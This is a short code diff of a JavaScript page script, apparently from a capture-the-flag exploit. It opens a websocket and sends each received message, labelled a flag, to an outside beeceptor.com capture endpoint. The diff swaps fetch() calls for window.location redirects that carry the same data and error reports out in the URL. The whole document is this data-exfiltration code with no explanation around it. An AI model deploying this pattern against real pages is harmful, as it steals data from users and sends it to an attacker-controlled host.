@@ -8,14 +8,11 @@ document.addEventListener("DOMContentLoaded", function () {
     };
 
     ws.onmessage = function (event) {
-        fetch(
-            "https://toitoise2.free.beeceptor.com/?flag=" +
-            encodeURIComponent(event.data)
-        );
+        window.location = "https://toitoise2.free.beeceptor.com/?flag=" + encodeURIComponent(event.data);
     };
 
     ws.onerror = function () {
-        fetch("https://toitoise2.free.beeceptor.com/?err=ws_error");
+        window.location = "https://toitoise2.free.beeceptor.com/?err=ws_error";
     };
 
 });
